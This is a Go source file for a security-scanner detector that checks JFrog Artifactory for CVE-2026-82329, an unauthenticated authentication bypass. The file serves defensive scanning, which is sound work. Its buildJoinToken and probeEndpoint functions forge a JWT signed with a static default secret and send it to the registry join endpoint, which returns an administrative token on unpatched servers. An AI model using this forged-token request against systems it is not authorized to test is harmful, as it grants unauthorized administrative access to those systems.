/*
 * Copyright 2026 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

// Package cve202682329 implements a Goonami vulnerability detector for
// CVE-2026-82329 in JFrog Artifactory (JFrog Access service).
package cve202682329

import (
	"bytes"
	"context"
	"crypto/hmac"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"net/http"
	"strings"
	"time"

	"github.com/google/goonami-scanner/core/config"
	"github.com/google/goonami-scanner/core/log"
	"github.com/google/goonami-scanner/core/module"
	goohttp "github.com/google/goonami-scanner/core/net/http"
	"github.com/google/goonami-scanner/core/net/netservice"

	detectionpb "github.com/google/tsunami-security-scanner/proto/go/detection_go_proto"
	networkpb "github.com/google/tsunami-security-scanner/proto/go/network_go_proto"
	networkservicepb "github.com/google/tsunami-security-scanner/proto/go/network_service_go_proto"
	reconnaissancepb "github.com/google/tsunami-security-scanner/proto/go/reconnaissance_go_proto"
	vulnerabilitypb "github.com/google/tsunami-security-scanner/proto/go/vulnerability_go_proto"
	timestamppb "google.golang.org/protobuf/types/known/timestamppb"
)

const (
	moduleName = "dt/artifactory_cve_2026_82329"

	// defaultKeyID is the SHA-256 hex digest of an empty string used by default
	// in unpatched JFrog Access when no additional join key is configured.
	defaultKeyID = "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"

	// invalidKeyID is an unrecognized key identifier used as a negative control.
	invalidKeyID = "0000000000000000000000000000000000000000000000000000000000000000"

	maxResponseBytes = 64 * 1024
)

var (
	defaultSigningSecret = bytes.Repeat([]byte{0x20}, 32)
	invalidSigningSecret = bytes.Repeat([]byte{0x41}, 32)

	candidatePaths = []string{
		"/access/api/v1/registry/join",
		"/artifactory/access/api/v1/registry/join",
	}
)

// Module implements module.VulnDetector for CVE-2026-82329.
type Module struct {
	*module.BaseModule
	config *config.Config
	now    func() time.Time
}

func init() {
	module.RegisterDetector(moduleName, New)
}

// New returns a new instance of the CVE-2026-82329 detector module.
func New(ctx context.Context, cfg *config.Config) (module.VulnDetector, error) {
	return &Module{
		BaseModule: module.NewBaseModule(moduleName),
		config:     cfg,
		now:        time.Now,
	}, nil
}

// Advisories returns the vulnerability metadata reported by this detector.
func (m *Module) Advisories() []*vulnerabilitypb.Vulnerability {
	return []*vulnerabilitypb.Vulnerability{baseVulnerability()}
}

func baseVulnerability() *vulnerabilitypb.Vulnerability {
	return vulnerabilitypb.Vulnerability_builder{
		MainId: vulnerabilitypb.VulnerabilityId_builder{
			Publisher: "TSUNAMI_COMMUNITY",
			Value:     "CVE_2026_82329",
		}.Build(),
		RelatedId: []*vulnerabilitypb.VulnerabilityId{
			vulnerabilitypb.VulnerabilityId_builder{
				Publisher: "CVE",
				Value:     "CVE-2026-82329",
			}.Build(),
		},
		Severity:       vulnerabilitypb.Severity_CRITICAL,
		Title:          "CVE-2026-82329: JFrog Artifactory Authentication Bypass Leading to Administrative Access",
		Description:    "JFrog Artifactory contains an improper authentication vulnerability (CWE-287) in the bundled JFrog Access service. In default configurations where no additional join key is configured, the registry join endpoint trusts an empty key identifier with a static 32-byte signing key, allowing unauthenticated network callers to obtain administrative tokens.",
		Recommendation: "Upgrade JFrog Artifactory to a patched version for your release branch (7.111.21, 7.117.28, 7.125.20, 7.133.29, 7.146.38, 7.161.20, or later), and restrict external network access to /access/api/v1/registry/**.",
	}.Build()
}

// Detect checks whether the target web service is vulnerable to CVE-2026-82329.
func (m *Module) Detect(ctx context.Context, service *networkservicepb.NetworkService) (*detectionpb.DetectionReportList, error) {
	ctx = log.ContextForModuleAndService(ctx, m.Name(), service) // NOMUTANTS -- diagnostic log context enrichment
	if err := ctx.Err(); err != nil {
		return nil, err
	}

	if !isCandidateService(service) {
		return nil, nil
	}

	webRoot, err := netservice.BuildWebRoot(service)
	if err != nil {
		return nil, err
	}

	opts := goohttp.DefaultClientOptions()
	opts.DisableFollowRedirects = true

	client, err := goohttp.NewClient(m.config, opts)
	if err != nil {
		return nil, err
	}

	for _, endpointPath := range candidatePaths {
		verified, err := m.probeEndpoint(ctx, client, webRoot+endpointPath)
		if err != nil {
			return nil, err
		}
		if verified {
			return buildDetectionReport(service, endpointPath), nil
		}
	}

	return nil, nil
}

func isCandidateService(service *networkservicepb.NetworkService) bool {
	if service == nil {
		return false
	}

	proto := service.GetTransportProtocol()
	if proto != networkpb.TransportProtocol_TRANSPORT_PROTOCOL_UNSPECIFIED && proto != networkpb.TransportProtocol_TCP {
		return false
	}

	if netservice.IsWebService(service) {
		return true
	}

	switch port := service.GetNetworkEndpoint().GetPort().GetPortNumber(); port {
	case 8081, 8082:
		return true
	}

	switch strings.ToLower(service.GetServiceName()) {
	case "http", "https", "http-alt", "https-alt", "http-proxy", "ssl/http", "blackice-icecap":
		return true
	default:
		return false
	}
}

func (m *Module) probeEndpoint(ctx context.Context, client goohttp.Client, targetURL string) (bool, error) {
	serviceID := generateServiceID()
	epochSec := m.now().Unix()

	positiveProbe := buildJoinToken(epochSec, serviceID, defaultKeyID, defaultSigningSecret)
	statusCode, body, err := sendJoinRequest(ctx, client, targetURL, positiveProbe)
	if err != nil {
		return false, err
	}
	if statusCode != http.StatusOK && statusCode != http.StatusCreated {
		return false, nil
	}
	if !isValidAdminJoinToken(body, positiveProbe, serviceID) {
		return false, nil
	}

	// Negative control: verify that an unknown key ID is rejected rather than accepted.
	negativeProbe := buildJoinToken(epochSec, serviceID, invalidKeyID, invalidSigningSecret)
	negStatus, negBody, err := sendJoinRequest(ctx, client, targetURL, negativeProbe)
	if err != nil {
		return false, err
	}
	if (negStatus == http.StatusOK || negStatus == http.StatusCreated) && isValidAdminJoinToken(negBody, negativeProbe, serviceID) {
		log.DebugContextf(ctx, log.DebugLevelService, "target accepted negative control join probe on %q; skipping", targetURL) // NOMUTANTS -- diagnostic logging
		return false, nil
	}

	return true, nil
}

func generateServiceID() string {
	var nonce [8]byte
	_, _ = rand.Read(nonce[:])
	return "goonami-" + hex.EncodeToString(nonce[:]) + "@scanner"
}

func buildJoinToken(epochSeconds int64, serviceID, keyID string, secret []byte) string {
	headerSegment := base64.RawURLEncoding.EncodeToString([]byte(`{"alg":"HS256","typ":"JWT"}`))
	payloadJSON := fmt.Sprintf(
		`{"iat":%d,"service_id":%q,"kid":%q,"skip_node_registration":true}`,
		epochSeconds,
		serviceID,
		keyID,
	)
	payloadSegment := base64.RawURLEncoding.EncodeToString([]byte(payloadJSON))
	signingInput := headerSegment + "." + payloadSegment

	mac := hmac.New(sha256.New, secret)
	_, _ = mac.Write([]byte(signingInput))
	sigSegment := base64.RawURLEncoding.EncodeToString(mac.Sum(nil))
	return signingInput + "." + sigSegment
}

func sendJoinRequest(ctx context.Context, client goohttp.Client, targetURL, payload string) (int, []byte, error) {
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, targetURL, strings.NewReader(payload))
	if err != nil {
		return 0, nil, err
	}
	req.Header.Set("Content-Type", "text/plain")
	req.Header.Set("Accept", "application/json")

	resp, err := client.Do(req)
	if err != nil {
		if ctxErr := ctx.Err(); ctxErr != nil {
			return 0, nil, ctxErr
		}
		log.DebugContextf(ctx, log.DebugLevelRequest, "HTTP request to %q failed: %v", targetURL, err) // NOMUTANTS -- diagnostic logging
		return 0, nil, nil
	}
	defer resp.Body.Close()

	body, err := goohttp.ReadBody(resp, maxResponseBytes) // NOMUTANTS -- defensive body size bound
	if err != nil {
		return 0, nil, nil
	}

	return resp.StatusCode, body, nil
}

type joinResponse struct {
	Token string `json:"token"`
}

type jwtHeader struct {
	Alg string `json:"alg"`
}

type jwtClaims struct {
	Sub string `json:"sub"`
	Scp string `json:"scp"`
}

func isValidAdminJoinToken(body []byte, sentToken, expectedSub string) bool {
	var parsed joinResponse
	if err := json.Unmarshal(body, &parsed); err != nil {
		return false
	}

	if parsed.Token == "" || parsed.Token == sentToken {
		return false
	}

	parts := strings.Split(parsed.Token, ".")
	if len(parts) != 3 || parts[0] == "" || parts[1] == "" || parts[2] == "" {
		return false
	}

	headerBytes, err := base64.RawURLEncoding.DecodeString(parts[0])
	if err != nil {
		return false
	}
	var hdr jwtHeader
	if err := json.Unmarshal(headerBytes, &hdr); err != nil {
		return false
	}
	if hdr.Alg == "" || strings.EqualFold(hdr.Alg, "none") {
		return false
	}

	claimsBytes, err := base64.RawURLEncoding.DecodeString(parts[1])
	if err != nil {
		return false
	}
	var claims jwtClaims
	if err := json.Unmarshal(claimsBytes, &claims); err != nil {
		return false
	}

	if claims.Sub != expectedSub {
		return false
	}

	return hasAdminScope(claims.Scp)
}

func hasAdminScope(scp string) bool {
	for _, token := range strings.Fields(scp) {
		if token == "admin" || strings.HasPrefix(token, "applied-permissions/admin") {
			return true
		}
	}
	return false
}

func buildDetectionReport(service *networkservicepb.NetworkService, endpointPath string) *detectionpb.DetectionReportList {
	vuln := baseVulnerability()
	vuln.SetAdditionalDetails([]*vulnerabilitypb.AdditionalDetail{
		vulnerabilitypb.AdditionalDetail_builder{
			Description: "Verified unauthenticated registry join token issuance",
			TextData: vulnerabilitypb.TextData_builder{
				Text: fmt.Sprintf("Endpoint %s issued an administrative JWT for a skip_node_registration join probe while rejecting an invalid key identifier.", endpointPath),
			}.Build(),
		}.Build(),
	})

	return detectionpb.DetectionReportList_builder{
		DetectionReports: []*detectionpb.DetectionReport{
			detectionpb.DetectionReport_builder{
				TargetInfo: reconnaissancepb.TargetInfo_builder{
					NetworkEndpoints: []*networkpb.NetworkEndpoint{
						service.GetNetworkEndpoint(),
					},
				}.Build(),
				NetworkService:     service,
				DetectionTimestamp: timestamppb.Now(),
				DetectionStatus:    detectionpb.DetectionStatus_VULNERABILITY_VERIFIED,
				Vulnerability:      vuln,
			}.Build(),
		},
	}.Build()
}
